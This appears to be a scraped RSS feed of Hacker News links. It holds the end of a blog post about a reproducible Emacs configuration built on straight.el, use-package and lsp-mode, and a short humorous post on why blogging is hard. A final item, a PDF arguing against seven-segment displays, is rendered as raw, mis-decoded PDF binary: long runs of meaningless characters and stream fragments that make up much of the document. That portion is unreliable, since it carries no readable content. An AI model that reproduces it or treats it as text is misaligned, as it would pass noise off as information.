    I want to be able to erase my entire setup, clone it down from a git repo, run Emacs, and be back to where I was before I nuked it all (assuming I've got no local, uncommitted changes). Additionally: I want to have a lockfile-like setup for freezing package versions.
   </p>
   <h5 id="straight-el">
    <a href="#straight-el">→ </a>straight.el
   </h5>
   <p>
    The <a href="https://github.com/raxod502/straight.el">straight.el</a> package manager is extremely powerful and allows for extreme reproducibility. It does so via:
   </p>
   <ul>
    <li>
     Installing packages via git clone versus a tarball or some other archive <a href="#footnote-2"><sup id="footnote-ref-2">2</sup></a>
    </li>
    <li>
     Easy integration of customized packages into your own setup, if desired <a href="#footnote-3"><sup id="footnote-ref-3">3</sup></a>
    </li>
    <li>
     A lockfile for controlling versions of each package <a href="#footnote-4"><sup id="footnote-ref-4">4</sup></a>
    </li>
    <li>
     Integration with <code>use-package</code> (more on that <a href="">later</a>) <a href="#footnote-5"><sup id="footnote-ref-5">5</sup></a>
    </li>
   </ul>
   <p>
    The straight.el bootstrap process allows for a totally self-installing setup. For example, with my configuration you just clone my repo to <code>~/.emacs.d</code> and run Emacs; straight.el bootstraps itself and handles installing everything that I need.
   </p>
   <p>
    Check out the exquisite straight.el documentation or <a href="https://hristos.co/init.el">my own init.el</a> file for details about how to get setup. It can do far more than what I've described here, so prepare for a deep dive. <a href="#footnote-6"><sup id="footnote-ref-6">6</sup></a>
   </p>
   <h4 id="declarative-package-installation">
    <a href="#declarative-package-installation">→ </a>Declarative Package Installation
   </h4>
   <p>
    As described above and in the project README, straight.el brings a nice element of reproducibility and control over packages and versions, but to take it even further I handle all package installations and their related config with <a href="https://jwiegley.github.io/use-package/">use-package</a>.
   </p>
   <p>
    Integrating use-package with straight.el does require some configuration; again: see the straight.el documentation or <a href="https://hristos.co/init.el">my own init.el</a> file for specifics. I strongly advise giving the project README a good look, it is high-quality documentation. <a href="#footnote-7"><sup id="footnote-ref-7">7</sup></a>
   </p>
   <h5 id="use-package--installing">
    <a href="#use-package--installing">→ </a>use-package: Installing
   </h5>
   <p>
    use-package is extremely powerful and also very simple to use. The straight.el integration is done well too; consider this example for setting up OCaml support:
   </p>
   <pre><code><span>(</span><span>use-package</span> tuareg <span>:</span>defer t <span>:</span>straight t<span>)</span>
</code></pre>
   <p>
    The use-package syntax is simple and explicit, but what's happening here?
   </p>
   <ol>
    <li>
     I'm installing the <code>tuareg-mode</code> package <a href="#footnote-8"><sup id="footnote-ref-8">8</sup></a>
    </li>
    <li>
     I'm telling use-package to not load this package until it's needed
    </li>
    <li>
     I'm telling straight.el to handle the installation
    </li>
    <li>
     By default, straight.el will try to find the package on Github
    </li>
   </ol>
   <p>
    Of course that's a very simple example; the use-package readme describes all the various features you can use to tune your setup.
   </p>
   <h5 id="use-package--configuring">
    <a href="#use-package--configuring">→ </a>use-package: Configuring
   </h5>
   <p>
    use-package allows configuring packages before and after they are loaded via the <code>:init</code> and <code>:config</code> keyword arguments, respectively.
   </p>
   <pre><code><span>(</span><span>use-package</span> flycheck-status-emoji
  <span>:</span>straight t
  <span>:</span>config
  <span>(</span><span>flycheck-status-emoji-mode</span><span>))</span>
</code></pre>

<pre><code><span>(</span><span>use-package</span> marginalia
  <span>:</span>straight t
  <span>:</span>init
  <span>(</span><span>marginalia-mode</span><span>))</span>
</code></pre>
   <h5 id="use-package--key-binds">
    <a href="#use-package--key-binds">→ </a>use-package: Key Binds
   </h5>
   <p>
    use-package also allows for configuring key binds on package load:
   </p>
   <pre><code><span>(</span><span>use-package</span> windmove
  <span>:</span>straight t
  <span>:</span>bind
  <span>(</span><span>"M-e"</span> . windmove-left<span>)</span>
  <span>(</span><span>"M-u"</span> . windmove-right<span>)</span>
  <span>(</span><span>"M-k"</span> . windmove-up<span>)</span>
  <span>(</span><span>"M-j"</span> . windmove-down<span>))</span>
</code></pre>
   <p>
    All keybinds then live in your configuration, nicely inside the package declarations themselves.
   </p>
   <h5 id="use-package--hooks">
    <a href="#use-package--hooks">→ </a>use-package: Hooks
   </h5>
   <p>
    The last feature I'm going to discuss is use-package's syntax for hooks:
   </p>
   <pre><code><span>(</span><span>use-package</span> html-mode
  <span>:</span>no-require t
  <span>:</span>hook <span>(</span><span>web-mode</span> . skewer-html-mode<span>))</span>
</code></pre>
   <p>
    This should be starting to feel familiar, and again it's nice to have hooks defined with the related packages in an idiomatic way.
   </p>
   <h4 id="language-server">
    <a href="#language-server">→ </a>Language Server
   </h4>
   <p>
    But enough about the awesomeness of straight.el and use-package! One of the main things I wanted when I moved to Emacs was a powerful system for auto-completing code. Emacs has several ways to achieve this, but what I've come to use for almost every mode is <a href="https://emacs-lsp.github.io/lsp-mode/">lsp-mode</a> for integrating <a href="https://microsoft.github.io/language-server-protocol/">language server</a> capabilities into Emacs.
   </p>
   <p>
    I'm using lsp-mode with almost all of the languages I work with regularly, except Lua. At least for now and for me, the current LSP experience with Lua wasn't as good as using company-mode. I'll definitely revisit that in the future though.
   </p>
   <p>
    There's isnt much else to say that isn't better said on the project documentation: but you can also refer to <a href="https://git.sr.ht/~hristoast/dot-emacs/tree/2bb9a7dd5ca8cb281c4f8a9a8bea0508464b5c63/item/lib/h-lsp.el">my configuration</a> for usage examples if desired.
   </p>
   <h4 id="quality-of-life">
    <a href="#quality-of-life">→ </a>Quality Of Life
   </h4>
   <p>
    Aside from that, there are a number of other things I've tuned to make my Emacs experience more to my liking:
   </p>
   <ul>
    <li>
     A dark theme for the editing area <a href="#footnote-9"><sup id="footnote-ref-9">9</sup></a>
    </li>
    <li>
     A dark theme for the mode line <a href="#footnote-10"><sup id="footnote-ref-10">10</sup></a>
    </li>
    <li>
     A dashboard or "startup page" <a href="#footnote-11"><sup id="footnote-ref-11">11</sup></a>
    </li>
    <li>
     Emoji icons for Flycheck status <a href="#footnote-12"><sup id="footnote-ref-12">12</sup></a>
    </li>
    <li>
     A handful of helper functions
    </li>
    <li>
     ws-butler, to clean up whitespace in edited files <a href="#footnote-13"><sup id="footnote-ref-13">13</sup></a>
    </li>
    <li>
     "TODO" keyword highlighting <a href="#footnote-14"><sup id="footnote-ref-14">14</sup></a>
    </li>
    <li>
     Rainbow parenthesis <a href="#footnote-15"><sup id="footnote-ref-15">15</sup></a>
    </li>
    <li>
     Yasnippet for inserting various snippets <a href="#footnote-16"><sup id="footnote-ref-16">16</sup></a>
    </li>
    <li>
     And many many more
    </li>
   </ul>
   <p>
    Software that's as endlessly customizeable as Emacs allows for all kinds of personal tweaks and touches. Over the year's I've built up my own collection of these and it continues to grow as I learn new things about Emacs.
   </p>
   <h4 id="custom-keybindings">
    <a href="#custom-keybindings">→ </a>Custom Keybindings
   </h4>
   <p>
    Last but not least: most folks will end up wanting to change a key binding at some point. Some go as far as to change the entire paradigm of the keybinds to do something like offer Vim bindings.
   </p>
   <p>
    I keep most of the default Emacs bindings but have changed more than a handful to suit my own needs. Some of these are defined with their related packages, others are just general additions or changes to some default Emacs binding. <a href="#footnote-17"><sup id="footnote-ref-17">17</sup></a>
   </p>
   <p>
    If you've never done so, I highly encourage taking a look at <code>M-x describe-bindings RET</code>. It's a high-level view of all bindings in your setup.
   </p>
   <h3 id="conclusion">
    <a href="#conclusion">→ </a>Conclusion
   </h3>
   <p>
    This was definitely not written for the unitiated, but I hope it was somewhat useful as a reference to "modding" Emacs.
   </p>
   <p>
    In particular, I'd like to highlight the power and usefulness of managing the editor configuration with Lisp code rather than clicking endlessly through some user interface (the general experience of most other editors).
   </p>
   <p>
    Having Lisp specifically and having it so tightly integrated with Emacs is where the majority of this power comes from. Learning to use it and work with it has been and continues to be a really great experience for me.
   </p>
   <h3 id="footnotes-and-references">
    <a href="#footnotes-and-references">→ </a>Footnotes And References
   </h3>
   
  </div></div>]]>
            </description>
            <link>https://hristos.co/blog/my-custom-emacs-setup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26373802</guid>
            <pubDate>Sun, 07 Mar 2021 06:51:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blogging Is Hard]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26373425">thread link</a>) | @luu
<br/>
March 6, 2021 | https://yosefk.com/blog/blogging-is-hard.html | <a href="https://web.archive.org/web/*/https://yosefk.com/blog/blogging-is-hard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>I've already written some stuff here. I read it again and wiped it out. It was self-righteous. I hate self-righteous. I could talk about how I hate self-righteous, but I won't, because that would be self-righteous. See? It's hard to blog without being self-righteous.</p>
<p>I mostly wanted a technical blog, with an occasional sprinkle of life in it, like a picture or something. But mostly technical. Tech blogs I like fall into two overlapping categories: informative and entertaining. Sometimes both. Myself, I sure manage to deliver both in the physical world. "Could you see that bug I bump into?" "Yeah, let's look at that, aha, oh,<em> not this code, </em>SHIT, this thing sucks, it's a torrent of shit, man, it's a ShitTorrent we have here. Ewww, this is so disgusting, wait, what do you mean _next==-1, -1 MY ASS, what the hell… um… get_what?! <em>Here's</em> that stupid fucking bug! Have a nice day." See? Informative <em>and </em>entertaining. Sometimes I even gather little audiences looking over my shoulder when I debug, all because profanity is my number one debugging tool. Catches all the bugs in a snap. Trust me.</p>
<p>And that is loads of fun. Trouble is, it's not necessarily the kind of thing people want to get as a response for their next HTTP request. So I think I'll go for "informative" as first priority. If it works out at all. I have this problem with scaling communication. According to my estimations, the quality of my communication is inversely proportionate to the number of people listening (or people that I think are listening). That is, you get 100% face-to-face with nobody around, 50% if there's two of you and so on. All the way down to a whopping 1% of my exceptional rhetorical skills when I think I'm talking to an audience.</p>
<p>With this kind of personality, blogging is pretty hard. Seems like there's no reason to bother, then, but I think I will, because there's stuff in my brain that wants to come out. I recently spoke to a guy with lots of experience, in a broad sense. He's previously told me a couple of times how it would be wiser to keep my mouth shut in certain contexts. But this time, he said, "sometimes it's extremely hard to hold it when I hear something stupid". What I think happens is, our brains are really cells of a larger brain (<a title="shaped like the Internet" href="http://xkcd.com/192/">shaped like the Internet</a>, of course); when stuff wants to come out, they <em>have </em>to let it out.</p>
<p>And this is going to be in English, because writing about programming in Russian or Hebrew, which are my other options, is frigging <em>ridiculous</em>. Fellow Russians and/or Israelis, stop doing that! You ought to put so many English words into your text, like "threads", "namespaces", "closures", that you end up switching languages twice per sentence. Or you can use those <em>moronic </em>translations of such words. That still counts as switching between languages – one good one and one stupid one. Just write the whole thing in English; makes it way more machine-readable, too (you know, vi). And if your English, like mine, is really just a first-order approximation rather than the real thing, it's not <em>your </em>problem – you won't notice. The native English speakers shouldn't have had their ancestors conquer that much land; now, they'll just have to put up with the consequences.</p>
							</div></div>]]>
            </description>
            <link>https://yosefk.com/blog/blogging-is-hard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26373425</guid>
            <pubDate>Sun, 07 Mar 2021 05:33:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don’t use 7-segment displays (2011) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 24 (<a href="https://news.ycombinator.com/item?id=26373405">thread link</a>) | @parsecs
<br/>
March 6, 2021 | http://www.harold.thimbleby.net/cv/files/seven-segment.pdf | <a href="https://web.archive.org/web/*/http://www.harold.thimbleby.net/cv/files/seven-segment.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div g="">Éê-Ø¦¶ÐêÀ[4õkéy¥Xð=A,(Ý¯RÑ‘a€ÆÝˆâ€“�†ýÈª„=~6A<yŽwrÏ¶Ön·{¹fÈ$Â˜î èóiu£žñz1ð¸w_="" ¦�ƒ�Øo{'”g="" ç0âc="kŒÅä%F.=óÈe&quot;@ƒ×‰�Ž¿vŒ‘Ûô:ñŒ1–®¼BðÞýJ÷jê¼ÒLìžum/EËÍØ3r˜hŠ3âz_vŒîñpQCAí¤©{¡u" éíå§r^(•w²ë\íÑù?Ái(wb~ì="" )¯.k(rÄ‹Œ{‹ŒÏ="">/ñuÂÂ ®ƒøæ
úÆseóå&gt;Ç„˜0ÑwÎø°t²‚×zÈÎPŒ)/XcÁ½ÁNã*0ÂoÝCMËe¦\”ø
ZR-¬&amp;˜¥žQ¶SËò&nbsp;ùa'-k&gt;FŸ,åù‰âÆ¯Rïè´®I/ˆw°zÀá‰U´[ˆ§Ÿ€5J¼¥C–i’ð‰Eîf’êÚˆ21„u6qÞQèv‡;æ÷±Blr•T÷0Pî…|
ô½X@IjF{àD¸1¿ÔsF0‚à1PØ”G&lt;]Ì¶{¼É”å—2ep‹ƒáh§§D™¾'ÛŸSè'SÌŒle²¸·C=¿Z&amp;b�÷Y‡Å]À�É+ÁR!Šƒ8&lt;.Líƒ®ý›­]þj~3-&amp;˜1ûß’°É~{šcA‚E„™I¯ñ\›H52jÀDæ°µˆ€ú‡ÄôlMÇÂ:€aÎHö\“Ý îþãü	ÅÁöÞ½{ÇcéT	òvóùmµ˜³Ž«!�L^’HË¥}
zÿágû+’·?~¸ûîã‹oA©Œyê÷(ŒÃßøø1 &amp;˜±SÖD™/žŽ&nbsp;ƒÅFÓšÚð<gÿ~ù(z½á›‘À ="" Ðm��ˆ^ˆ°kÂ�="" ¥<é�<9z#´ÇÑœnôfö®Ê|Üô¥xÒÓgëg;nu¶�ô`‹àiÖwh{fnî="" ·—¢a="" ÒŽÃ]¢<%Óÿëm="" ¢ÎÍ="" ¦,Õãlööb1hr="" j—øžŠ¬rË3œ%'l{‹ôjùì¸þysx¾¼‰„öx®¦À¾ÿïÌj="" endstream="" endobj="" 14="" 0="" obj="" <<="" type="" page="" contents="" 15="" r="" resources="" 13="" mediabox="" [0="" 595.276="" 841.89]="" parent="" 19="">&gt; endobj
3 0 obj &lt;&lt;
/Type /XObject
/Subtype /Image
/Width 1500
/Height 126
/BitsPerComponent 8
/ColorSpace /DeviceRGB
/Length 33027
/Filter/FlateDecode
/DecodeParms&lt;&gt;
&gt;&gt;
stream
xì½wÔo7q†BrC˜PC$¡šŽéÍôÞ{‡Ð;$tLï½Cè½ƒ)¦šbŠ��ÈÅ4‡îÐIå&gt;Akié¾{kï–´Ïù€9œ¥O[3½�F£ò;Þ¯ýë?ˆ�@ �@ �@ �@ {�?Ü»ÕEm�@ �@ �@ �@ ÿ‡@eB�@ �@ �@ �@ ØDPf€U�@ �@ �@ �@ A™Ð�@ �@ �@ �@ ö”Ù&nbsp;G•�@ �@ �@ �@ DP&amp;t �@ �@ �@ �}€@eöèQe �@ �@ �@ ”	�@ �@ �@ �@` A™}zT�@ �@ �@ �@eB�@ �@ �@ �@ ØDPf€U�@ �@ �@ �@ A™Ð�@ �@ �@ �@ ö”Ù&nbsp;G•�@ �@ �@ �@ DP&amp;t �@ �@ �@ �}€@eöèQe �@ �@ �@ ”	�@ �@ �@ �@` A™}zT�@ �@ �@ �@eB�@ �@ �@ �@ ØDPf€U�@ �@ �@ �@ A™Ð�@ �@ �@ �@ ö”Ù&nbsp;G•�@ �@ �@ �@ DP&amp;t �@ �@ �@ �}€@eöèQe �@ �@ �@ ”	�@ �@ �@ �@` A™}zT�@ �@ �@ �@eB�@ �@ �@ �@ ØDPf€U�@ �@ �@ �@ A™Ð�@ �@ �@ �@ ö´ê¬Wùßÿýß¿úÕ¯êß­/':Ñ‰Žw¼ãYE½Bÿñÿñ_ÿõ_^ÙùRø‡xÂžpþ[kî/ùËÿùŸÿi¥þ?º?ú£?:Á	NÐÃAhýë_ÿâ¿àÉ_õçÿó›«H–ƒX-—ÙñëŸþéŸÿøÇß±˜_�B¯üò³%OTýÃþðOúÓYÌÌÓ�îtó7cvŠa©ÞûÞ÷þïÿþ¯S¸V‘¬öµ!ˆªc©°W
µ×H¾úÕ¯~á_¨}uòz—»ÜåÆZu&amp;:Ñ©½V©0µ¯mùøÀ0¡m´‰êŒg&lt;ã_ýÕ_õpÚÿüÏÿ&lt;âˆ#:­ú¹Ï}îSŸúÔÂ¹çÏïÿûŸüä'{8@{‰K\bì¼üÿþæ_�TÌ~—¹Ìez8Li?õ©O}ï{ß›æû9§8Å)&gt;ø`¿¼S¥êœÿâ7ÿœºÌ2ø	ïÿûÍÂµbç;ßùNyÊSÖ¾6ä‡Wìƒ^±‰n•Y¸Vì‚¼àÉNv²Ú×†üo~ó›ÿôOÿÔ@˜IppÆúê»sxä‘Gþä'?É
oHtÐAû·Û@X#ÁIøùÏ^ûjæÿÉŸüÉÿñ›…�bÿþïÿþÑ�~Ô)¹Pæ¢½èŸýÙŸ-øieð’“��&nbsp;9ÉINrà�ŽÂ½ÿÎw¾Óé’"Ì©Nuªý÷ßˆTóƒüàG?úQ'7ìkÂQë
¨{öìùÙÏ~Ö)¡¢ÓŸþôüßÉ'‘û@©XWtr%°µ,dÝõío»_ÕOzÒ“ôÿ~üã£ê�@AÎêk”ýB©îq�{&lt;å)Oé”ŠèvyÔP×½îußýîwwJu–³œåŸø�ØÉ'‘£ä¨zgøV`uÚÓžv”ªººöµ¯
b�m|ÐƒôÐ‡&gt;´“I&amp;?î¸ã:—©‰@�øÄ'Îl{tÜïxÇç?ÿù=L&nbsp;e–9ê¨£ÎzÖ³vòIä?üá¯q�kô»ïý×ý±�}lVÿò/ÿrå+_ùk_ûZgÅ¯~õ«;™dò·¾õ­7¸Á
ú½ÒÇ=îq÷º×½2ÛÎÄ£ýè&lt;à�Óñá‡~éK_ºS˜DÎ"çV·ºÕË_þòNnÌ}ØO¼…N&gt;‰œ¹ïªW½j¤�èÕ‡&gt;ô¡QÛ]£¼bfä�QÑðŠM•Û�^ñ±Ç‹ýì€À!‡Âü&gt;j	�‡võ«_�h»‰m­Ø]îr—~�13ß�^ñ½ï}ï'&gt;ñ‰YÈ¶ùÈGÎu®sµ‘Ë€ýÓê„IV;æ˜c®t¥+}éK_i×þy…+\ámo{Û(©–k?þCò�å{ç+�Ûo}ë[�;ÏIT¦üQ{˜Ä&gt;†øî†²2úíá=ô/rVÄPöÛo¿~UK±�þ)HEáƒÑ¿,„ÓOç~x
&amp;�!‹
úã5DÕñØÐ¨~ÿ/…ùú§Ã„ªÎÂ¾?¬†r^ëZ×zéK_šØöü�~¾ó�ï¼Ñ�n„`=|&nbsp;e)Èâäãÿx'È‰«²‰}ÃÞ°ÿd
a&gt;T½?Ì‡T`…&gt;ô«ç&gt;÷¹´nˆY`�sö³Ÿýç8G'ì4
“N¬¡“O"GE±	ýªÎfÎÕ®vµ×¿þõýRaÞóž÷ÜøÆ7î7¸2—ºÔ¥&gt;ûÙÏöKæDR®ýë÷[õw½ë]xHßýîwû¥B$æ¾‹_üâý¬žô¤'Ýò–·ì�þ#	GHXØs
¤S*òmns›Ç?þñ�| g¶"ä„5îßÇ§:ôÐCßþö·÷KÅDÃÁ–›Üä&amp;/êäöùÏUï&lt;Ð—d`»å+_ù
XuŠùX¯˜YfÈÆ3¼b§sq™”‡L½bÂŽ¨:‹U§	Ëe¾þõ¯c‡¯r•«,s¾¾ò•¯¼æ5¯Ùyô#UÄžg@Îsžó8õ.”îYbôØKxñ‹_¼ ¹ùi&nbsp;W+TßÃ¬z¡Ø@Ug3‰c§¶P�ùéË_þ2ÎÞå/y³|O±}”AééK¼¢´ÐÓ¡Å²¨`ß¸áp
–Á˜Àp”G-S“x4©sxÇ?ñö	�#8Är¥†ûÄ|G1¤^û@&amp;zßy¹äLp†�Æ¶E‹þíßþíä'?9TÖÏCbI6´”¤‚ŠFA˜ÎÈ”�íL#,Û ±!¨980j™ššCcq(Qªw™îÃõ§÷ov³›½ñ�oìÄ'“Ã%½ÈE.ÒL’ªƒó….t¡/~ñ‹™mg‚«=,À¸rÒ }—ì'hã¥±Ü)O"OªÞ¦TYÕÙZg&gt;p}ôÑ7½éM‰d1×6&nbsp;Ð(þ¡çhûZò…ò€�^%æÅf?eûÉa"b
³e2i#½jP*ªKR1ãÀ¡ÿ4J–ŸqMøƒ³E
R¡E¬"0üá_xÈ:'	FT”`
fªA*L
NQ¹×¾öµ·¾õ­G
@ø#`ì`Bb£¨zšÍïÿû?ãÏÈøw&amp;°	x¥Ü¸¤½
XeUgß²ÿàUnî'X9Ù L’T¬sXÂ1f¶�‰ý×%ð\É;ZÅ
{Â&nbsp;ãø$Õ�åD®�ä9ü°b.@-Ñ+t~TD&amp;	†�A£ó,ª™ØÎ+Fö&gt;Y&gt;`ØMar1¤JãßØm^1sª&gt;ÐÙûÜç&gt;Gü&nbsp;”
pØ‰‡–C”Œt,cØ™Àªßâ·`ù†Â¯eE¿3ÝàcÛ‰ ¯%_(Ÿ€hP*îÅ&amp;¯˜Ùêu¯{ÝB-«&gt;1œ™û0¡‰ù*Z
'ûÉ`AÕQûµäµòØ(ðÇ6ØO„+üì9ÌÀÅ2þ'[ŒÌÈ
ª^kélþÈ·f+¨e2™røG°§×=©q&amp;ÄÀ2•˜ñàµƒ
3�z±×A×2ž‡l,$9a…†±vJÌkÂÏæ3»£&nbsp;)B„¶
Ô‰ÔF˜¯
99&gt;ÇÆõ«^õ*Ò/Ñ$nØ/Ö«x¥³€Ô2±7¿ùÍÏ{ÞóâÔ‚7ák%×æãŽ}g2«µ-žT�'XŽr®­½V{Ê™d&amp;¶†{Ì¦¸À8&lt;ÂÄèÃÖjY›�ÙÂo;ÿùÏÏ&amp;ãhùÞðžŸHU;ì0´}ùBá{ÞóžÜ„¢û&lt;’‡?üá¨:{Å(ÕÓžö´Q�îcÇƒ(ªÎ_~ú‰^cÖÁž&nbsp;óœÔ­cåŒµIÌ§U/ä0l±Ÿh#âa�ÙûZ(¼êÓ9ÏyÎW¼â¬êYÔÙ\EËž¶àlAÅjØW‘/f9ÁØÉÌJN?½ìe/£QOxÂøÄ�•�f�«^·½ímQªµá'Fëýîw?®½ï}ï%�7¸�Ó–’ÃôÇE!R­í&gt;†Çˆ§¢Zg&gt;ó™ïsŸûÌVÑ�‰žðƒLJËÿ«8`I!k]ô|à–óyÏ{Ì9Ì¿v®[KÇˆî{ßûžéLgZÕ¨…ÂÌ×»Þõx0…ÛÅf?qb¥â¾â60	Î[›‰r&gt;æ1�A*”ŠÕÅ*ræâ;ßùÎ@Î&lt;2a¥a¸ŠC­06�Yì/x÷XÖŠÍæ³äVcÅŒ&lt;Ð+fŽ@Ûq&gt;“Ë=[{-“)‡›�}ÀL�õŠq³Ë]`6ŸPR¥®uÿqÅ\^ñ§?ýi‚Œ&nbsp;œi&amp;Ø3@ÓR�'L*§@áIfæI*ƒec%Ospù˜þ¸ÏèÓ.—D?Ùza=�ÍYk©Xqpâ˜ †„ß¾\—ÿ•«»læá'\ö²—e@ù„”dá€Wœ6“Pƒ�^1F'
�mX¾éMoÂ+fZGÂG&lt;â×5w»ÛÝ0SüÃÅ]…ùÈG2¡¿ùÍoÆ�]òüHZ]®=PÉ\Ì
b&amp;P¢E¬Œ^sN°¢ôàÀðÓ,æûæ¤­bn`ã»ƒ#†žy£3+¥ŸÉ„[Î,}æ3Ÿa@rågÂ\DaåÓâ+ÆœÍäŠTÄÒ`¶$
Ä~1a›™Ï–œfâX§å@oblÓÆ!ñ?ôd’Çº/Ü´AtÓîp‡G=êQLÒïxÇ;p#Ò+08•U±�Óœæ4hBZNàŽÓæt‹qÇ¿å-oA»¸«Â~Œ ¢®�-¦;
³Hj ÿÓ¡ˆ:-9Í¡vT‘†«:š@²2‡9zEEœ 0Q;¶&amp;hÛ×2{�3Jµ6†2m/zÎùXN´Òœ(b£Ób³9�}ìcYL2@¸«‚¹g†ye)Þ9ÑŸg=ëYpNÚ…ž›ª8l¹°:î”òè½ß®W†^ –Ÿü”
ƒcª:¨b©hRñ²Ÿ¨ÿf�õ31@€Â $æ¸&amp;¦Ra&nbsp;�*Ù7$A¹¸N“…ñe˜–„¾ÇI8(�1Di¯s�ë˜RaÀÓÅXD‚=¥êô ¦˜ˆ~&amp;ææj`qð‡¶ÜÉGÉQ*Ö‡¸ù4m¾ŸƒV¿ä%/Á/I|”
	éS‡Š!�ÚÐT´‰`åúŸ&gt;eqÂxáöYš¶�
Ý0'e4ŠÙœ³Pñ
2G¥p£
¯ËiÔBV)¸Y€ƒÞæqd*[»HÅRÕâ°BEY	4|EB›¥ QžÜ¤ù„f¤LíOÉãÇjÑqLÉõÏ~³@”œÓ(¸Rô�\pWMŒ2]âùµ!�nàqPVMý›½Œ5ÆMÂW�fê²öZ›ÂÌ,@k°‹]ìbèÿ{�ìÜ&nbsp;\{Ík^ƒ•†9›«æÉ&gt;.=1W2{2L�ÃŽÆ¢Öbæ³ëÉÄr¢tDr¹MU€¢9ü£-ØÏÝàcx¶´…I“®çß(¯½"Fgz�°&amp;–ÙÁa˜7q{(Ì0Al/
¹v»eZ=Å¤Œ&amp;dæt�é*àHcšXÕ£Eøêa^7gF^.œJ2ÄîY?ÓØÔdß+Æ3¼ä%/É£6ˆ‡$H…�pCÓ¦­Ê�íSŸúTÝ?ÿó?cX’6}uðÁ+fêä®
jÏD3ÊUÀ+fà`œ}tªg³]n¡bÃñŠyÂŸg1¡ìèÀÊä0[ýá%ÿ³”C$6'8iþDÂæãÆ.
I^1v�	=iÂluf&amp;=Åär§;Ý‰½ÏÄœm3Åèc)Ê,ƒ•ãÁG¶„	ùá1ö¿�,¸
t"Z�Tüï«ºÙð²Øñ¨£ü{/¤Q&amp;�*UŠn ‚›–�&nbsp;.‹´¤O¬žóœç°Û‘-&amp;˜XYìÏÿüÏ±ªè+ÿÊüµé4ùác•„D1œ;ÿ,ØÊ%
¬xÅEí€«d¸6ÍB·Ò25ÑÂœ{ìIÚen·»ÝíÒ®W*Æ¢‚kœ¤ÓBn™vù+s‘‚rr%°Z¦J_	÷²�K2°Ÿþô§£ÞH•3Û,uè¾ÒµE]�Ø0N;¥ª3‡±Ê¢ê`órüÆXìØFV8L]¥þpÜ»3DÕY®â)›ÌÚyÏI–,<sk ´‘ÉµÎ¹€ŸÀ¦Óyi™š¨aŽhffç¶s®Üpø“fÒ¹9¿!‘6±k�="" 7Žs¤+Ü÷Ò( �`ŽsÈÊ ê,2Ë¦%æ$éòˆ6âgÒ‰ÀÞyÛ@±yb¯²œzÂ�ËÖÀË²¹ü="" ì="" ÆrÙÆ²€™f…à="" Ì9ÇáøÊ{ØÃüàçŠhîb¾jÓ—ø="" Ì¦©="" r9xßâ`å’ÄÙãoÞ,‡s.à'k¨gÙ}Ä="" sïÈÅ,œÀi…Ù�c…�óÇyâÉ—°÷È2µ4ƒì·;'Îˆ1×”c="" £7n="" wºü•i™Ù�“žÌï¹$a1ÖqùÏz‚ur="" Åp`ˆhv£rò™s˜="" °„¹0jÅ4�¨9§–àx§ÀòwÂ1)šf÷uzðèztn="" Ä×¸šëzh€'‹�\€5azä ê9³-q¶³��="" zÜayÿ¢½hgnŒüpÍ%Ù="" àpÒwdÄi.w®«–ØÔ+Æ°‹ËmzÅ8¢Òx˜q^1amüÛ="" þ'Õ9qmõò\3éÎpø="" ñŠ1éˆqjezÅmãÔo&¼ýíoÏ3lÎlk°m†h¥wÌªÕ9dh‰)©ÄŠce,òË8{mÂd*æ÷ýo™ÿø�ÿÈú<¨%û„ŒËé€s3œïâã¥k¼="" kå(¦»Þõ®yæ$bÕy="" -eèò§µ="" &;‚på‹òØsºÀy�‚'3×nì—ðçu‡yùú="">�6®r]‰¿üË¿d­‘°À./3)'3rf[‚°,–yêr·qÛ‘jÌoÜìXMY˜ÄÉKŽ,Ë’²dCTÎÓppœ?ŠM—îøîäóJ4“I¦ãÇñÝ§R’|,~fÞœ(}w˜ÀÜ�”L#0×›&amp;†•3›Ò&amp;øLeD†Ú‰Ýò?-êW*,u9÷ÀÖì¾MU�g‘ñ¥"(SÎ=¦ü�¦[;��ÔþÁ¼ÝàÏâ¼V¸Ì/½dò¡JÚÈ¼XkK³á\šÝ‰H•”Š|Ž6”ÛÒlÈ”„¦TS/!búUæ­0 îû¬6-â_ÙÌ†4“t¹¤‡C¶9ËÜÄ˜P8a…?ä¸DËÌËˆ6%QWLè2Iú*J•ÛbnÉ.W!ÑS©àÉF\É9«:ÖÊü†4Š!Ñ
S*¨$Ð�°Â7åhCƒ$%	ÆYÌ&nbsp;©êì@”x&amp;©ˆˆñ¯¬¢!ýÂ¾ÁJÂÜeæ4-mL®ëUþMË¯Êyæ3ŸY–'âDd ©¹
S*¶¥	—„¦RaâdEšº¸ú•
ÅHTY0³û{•Èá¯3XNÊ07U½f?‡¸
â¨#•Ùƒ¢êc½bÑX&amp;/s¦©r[†xÅ5æYÍfj%x�TÙúUãYntùÝ‡£^Fd LªÎvB¿T”��
snêËRËÇJ\öo’U'"6Ûã«2åvº‘\î™ˆTá!ª.03_–ŠsseD†ÂIÕY)÷+UÍå^©ùëÿ­ð÷ò?ñ9¨}Hˆ!µ‚è¦4‡CY’3û§H…êg«:[~U¦0g1™á@&nbsp;�¿�9n�Êæ›—$µ4®&nbsp;üjÎˆÍý^ÖUKP3;¢™°&amp;I™ßÌ\°bËÅ9_SV½�æl‰˜5…pÔÏW'Q+³ûˆ¥Êšp&nbsp;ªû�5¡)•´…š„½–?53o&amp;ÌU/$D7°Ÿæ9[‘
cbºÂäOÍÌ¥9»AÕÙ²_v&nbsp;ªcÒ%`gj¬ò¥’îƒyÛ\@²Vt&amp;¤É„YÓ‘ºÙJs@x&nbsp;ª‹Tf/ÐéÄJÉMÂ’¤–†¹ì”˜JÅQ!8i¯Xu³É‚0­6	kø”ù¢|2U]ñŠÍhNY{--Ìw‰W,aöB³6ÖÀ)ó§^±©ê&lt;Ãk6§¬½––î£˜)• á@©š™!±‚Dµ¶¯Í¬D)¶²#‘j PTÝÆœýo9õ3P*ÓåÕ„4™K[|Â»€Ò}ä˜ªî0Ÿ–Ù÷A\‡�†^ú†ýÎ?O›=ÍÜÇ‚ÞÆ{*„æT:mÝ4C/®‰ÙdÎµ¹S¦9Ò^
